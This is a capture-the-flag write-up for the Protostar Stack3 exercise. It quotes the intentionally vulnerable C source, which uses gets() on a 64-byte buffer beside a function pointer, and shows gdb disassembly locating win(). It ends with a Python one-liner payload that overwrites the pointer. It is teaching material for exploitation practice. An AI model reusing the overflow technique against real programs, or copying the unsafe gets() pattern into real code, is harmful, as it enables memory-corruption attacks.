```
TL;DR -> `python -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3`
```

# Stack3

URL: https://exploit.education/protostar/stack-three/
Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

- both gdb and objdump is your friend you determining where the win() function lies in memory.
  This level is at /opt/protostar/bin/stack3

Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

# Writeup

It is similar to stack1, the only difference is that, we have to redirect the code execution to other (`win`) function.

we can easily get the address of `win` function in GDB using `x win`

```
user@protostar:/opt/protostar/bin$ gdb ./stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
End of assembler dump.
(gdb) x win
0x8048424 <win>:        0x83e58955
```

So the address of the win function is `0x8048424`.

Payload: `python -c "print 'A'*64 + '\x24\x84\x04\x08'"`

---

One liner solution:
`python -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3`
